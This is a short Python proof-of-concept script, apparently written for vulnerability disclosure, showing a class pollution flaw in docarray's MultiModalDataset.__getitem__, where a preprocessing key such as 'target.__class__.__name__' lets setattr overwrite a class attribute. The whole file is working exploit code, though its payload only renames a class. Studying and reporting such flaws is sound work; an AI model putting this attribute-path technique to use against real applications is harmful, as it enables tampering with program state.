# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: MultiModalDataset.__getitem__
# Type: get-attr-set-attr

from typing import Any
from docarray import BaseDoc
from docarray.data import MultiModalDataset

class Target: pass
target = Target()

class MyDoc(BaseDoc):
  text: str = "hello"
  target: Any = None

docs = [MyDoc(text="test", target=target)]

payload_value = "pwnd"

def run_poc():
  # MultiModalDataset.__getitem__ processes field paths split on "."
  # and traverses via getattr then sets via setattr
  # We create a dataset with a preprocessing key that traverses into __class__
  dataset = MultiModalDataset.__new__(MultiModalDataset)
  dataset.docs = docs
  dataset._preprocessing = {"target.__class__.__name__": lambda v: payload_value}
  dataset[0]

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
